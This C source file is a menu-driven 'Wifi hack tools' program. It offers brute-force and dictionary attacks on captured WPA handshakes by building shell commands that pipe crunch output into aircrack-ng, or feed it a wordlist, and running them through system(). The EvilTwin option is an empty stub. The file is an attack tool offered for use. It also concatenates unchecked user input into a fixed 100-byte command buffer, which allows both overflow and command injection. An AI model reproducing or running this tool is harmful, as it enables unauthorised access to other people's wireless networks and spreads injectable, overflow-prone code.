#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define _VERSION_                               "0.0.1 Beta"

//set color print
#define ANSI_COLOR_RESET            "\033[0m" // Text Reset
#define ANSI_COLOR_RED                 "\033[1;31m" // Red
#define ANSI_COLOR_GREEN            "\033[1;32m" // Green
#define ANSI_COLOR_YELLOW         "\033[1;33m" // Yellow
#define ANSI_COLOR_CYAN              "\033[1;36m" //Cyan
#define ANSI_COLOR_PURPLE         "\033[1;35m" // Purple

#define MAX_CMN_LEN 100

void head(void);
void brute(void);
void dict(void);
void linset(void){};

int main(void)
{
	int select;
	do
	{
	    head();
	    printf("\t\t\t"ANSI_COLOR_CYAN"Select your choice"ANSI_COLOR_RESET"\n"
	                     "\t\t"ANSI_COLOR_GREEN"[1]"ANSI_COLOR_RESET" BruteForce Attack (no passlist)\n"
	                     "\t\t"ANSI_COLOR_GREEN"[2]"ANSI_COLOR_RESET" Dictionary Attack (need passlist)\n"
	                     "\t\t"ANSI_COLOR_GREEN"[3]"ANSI_COLOR_RESET" EvilTwin Attack (Advance)\n"
	                     "\t\t"ANSI_COLOR_GREEN"[0]"ANSI_COLOR_RESET" Exit\n\n"
	                     "\t\t"ANSI_COLOR_YELLOW"Endic3 > "ANSI_COLOR_RESET); scanf("%d",&select);
	                     
	    if (select == 1) brute();
	    else if (select == 2) dict();
	    else if (select == 3) linset();
	    else {printf("\t\t"ANSI_COLOR_RED"Ending.........../"ANSI_COLOR_RESET"\n"); select = 0;}
	                     
	 }while(select != 0);
}


void head(void)
{
	printf(
ANSI_COLOR_CYAN
"                           ___                ___\n"
"         _________________/  /____     ______/  /_____________________\n"
"        /  ______________/  /____/    /_____/  /__________________   /\n"
"       /  /  ___        /  /  ______       /  /  _____________   /  /\n"
"      /  /  /   \\      /  /  /  _   \\     /  /  /   _________/  /  /\n"
"     /  /__/__/\\_\\____/_ /__/__/_\\___\\___/__/__/___/___________/  /\n"
"    /  _______________________________________________________   /\n"
"   /  /  /  /    \\ \\/  /  /  /__/   /  /  /  /   /________   /  /\n"
"  /  /  /  /      \\___/  /_________/  /  /  /____________/  /  /\n"
" /  /__/  /________________     _____/  /__________________/  /\n"
"/_____/  /________________/    /____/  /_____________________/\n"
"     /__/                          /__/\n"
ANSI_COLOR_RESET
"\n\t"ANSI_COLOR_GREEN"Wireless && Wifi hack tools version : "ANSI_COLOR_RESET
ANSI_COLOR_PURPLE"%s" ANSI_COLOR_RESET
"\n\t\t"ANSI_COLOR_RED"Create By"ANSI_COLOR_RESET
ANSI_COLOR_GREEN" : " ANSI_COLOR_RESET 
ANSI_COLOR_YELLOW" Rovoaries G estraiw" ANSI_COLOR_RESET"\n",_VERSION_);
}


void brute(void)
{
	char start[5], end[5], key[100], path[100], bssid[20];
	
	//input brute request
	system("clear");
	head();
	printf("\t\t"ANSI_COLOR_CYAN"Bruteforce Attack"ANSI_COLOR_RESET"\n");
	printf("\t\t"ANSI_COLOR_GREEN"[ ! ]"ANSI_COLOR_RESET" Enter Path of Handshake file\n");
	printf("\t"ANSI_COLOR_PURPLE"[Ex. /root/Desktop/wifi.cap] : "ANSI_COLOR_RESET);scanf("%s",&path[0]);
	printf("\t\t"ANSI_COLOR_GREEN"[ ! ]"ANSI_COLOR_RESET" Enter BSSID : ");scanf("%s",&bssid[0]);
	printf("\t\t"ANSI_COLOR_GREEN"[ ! ]"ANSI_COLOR_RESET" Enter key passphrase : ");scanf("%s",&key[0]);
	printf("\t\t"ANSI_COLOR_GREEN"[ ! ]"ANSI_COLOR_RESET" Start Lenge : ");scanf("%s",&start[0]);
	printf("\t\t"ANSI_COLOR_GREEN"[ ! ]"ANSI_COLOR_RESET" End Lenge : ");scanf("%s",&end[0]);
	
	//check information
	system("clear");
	head();
	printf("\t\t"ANSI_COLOR_PURPLE"Handshake Path : "ANSI_COLOR_RESET
	ANSI_COLOR_YELLOW"%s"ANSI_COLOR_RESET"\n",path);
	printf("\t\t"ANSI_COLOR_PURPLE"BSSID : "ANSI_COLOR_RESET
	ANSI_COLOR_YELLOW"%s"ANSI_COLOR_RESET"\n",bssid);
	printf("\t\t"ANSI_COLOR_PURPLE"Key phrase : "ANSI_COLOR_RESET
	ANSI_COLOR_YELLOW"%s"ANSI_COLOR_RESET"\n",key);
	printf("\t\t"ANSI_COLOR_PURPLE"Start lenge : "ANSI_COLOR_RESET
	ANSI_COLOR_YELLOW"%s"ANSI_COLOR_RESET"\n",start);
	printf("\t\t"ANSI_COLOR_PURPLE"End lenge : "ANSI_COLOR_RESET
	ANSI_COLOR_YELLOW"%s"ANSI_COLOR_RESET"\n",end);
	printf("\n\t\t"ANSI_COLOR_GREEN"[*] Check your information...."ANSI_COLOR_RESET"\n");system("sleep 5");
	printf("\n\t\t"ANSI_COLOR_GREEN"[*] Start Cracking...."ANSI_COLOR_RESET"\n");system("sleep 5");
	
	//action start brute with crunch
    char cmd[MAX_CMN_LEN] = "";
        strcat(cmd, "crunch");
        strcat(cmd, " ");
        strcat(cmd, start);
        strcat(cmd, " ");
        strcat(cmd, end);
        strcat(cmd, " ");
        strcat(cmd, key);
        strcat(cmd, " ");
        strcat(cmd, "|");
        strcat(cmd, "aircrack-ng");
        strcat(cmd, " ");
        strcat(cmd, path);
        strcat(cmd, " ");
        strcat(cmd, "--bssid");
        strcat(cmd, " ");
        strcat(cmd, bssid);
        strcat(cmd, " ");
        strcat(cmd, "-w");
        strcat(cmd, " ");
        strcat(cmd, "-");
        
        //run crack
        system(cmd);
}
	
void dict(void)
{
	char path[100], bssid[20], pass[100];
	
	//input dict request
	system("clear");
	head();
	printf("\t\t"ANSI_COLOR_CYAN"Bruteforce Attack"ANSI_COLOR_RESET"\n");
	printf("\t\t"ANSI_COLOR_GREEN"[ ! ]"ANSI_COLOR_RESET" Enter Path of Handshake file\n");
	printf("\t"ANSI_COLOR_PURPLE"[Ex. /root/Desktop/wifi.cap] : "ANSI_COLOR_RESET);scanf("%s",&path[0]);
	printf("\t\t"ANSI_COLOR_GREEN"[ ! ]"ANSI_COLOR_RESET" Enter BSSID : ");scanf("%s",&bssid[0]);
	printf("\t\t"ANSI_COLOR_GREEN"[ ! ]"ANSI_COLOR_RESET" Enter Path of passlist\n");
	printf("\t"ANSI_COLOR_PURPLE"[Ex. /root/Desktop/word.lst] : "ANSI_COLOR_RESET);scanf("%s",&pass[0]);
		
	//check information
	system("clear");
	head();
	printf("\t\t"ANSI_COLOR_PURPLE"Handshake Path : "ANSI_COLOR_RESET
	ANSI_COLOR_YELLOW"%s"ANSI_COLOR_RESET"\n",path);
	printf("\t\t"ANSI_COLOR_PURPLE"BSSID : "ANSI_COLOR_RESET
	ANSI_COLOR_YELLOW"%s"ANSI_COLOR_RESET"\n",bssid);
	printf("\t\t"ANSI_COLOR_PURPLE"Passlist Path : "ANSI_COLOR_RESET
	ANSI_COLOR_YELLOW"%s"ANSI_COLOR_RESET"\n",pass);
	printf("\n\t\t"ANSI_COLOR_GREEN"[*] Check your information...."ANSI_COLOR_RESET"\n");system("sleep 5");
	printf("\n\t\t"ANSI_COLOR_GREEN"[*] Start Cracking...."ANSI_COLOR_RESET"\n");system("sleep 5");
	
	//action start dictionary atack
    char cmd[MAX_CMN_LEN] = "";
        strcat(cmd, "aircrack-ng");
        strcat(cmd, " ");
        strcat(cmd, path);
        strcat(cmd, " ");
        strcat(cmd, "--bssid");
        strcat(cmd, " ");
        strcat(cmd, bssid);
        strcat(cmd, " ");
        strcat(cmd, "-w");
        strcat(cmd, " ");
        strcat(cmd, pass);
        
        //run crack
        system(cmd);
}
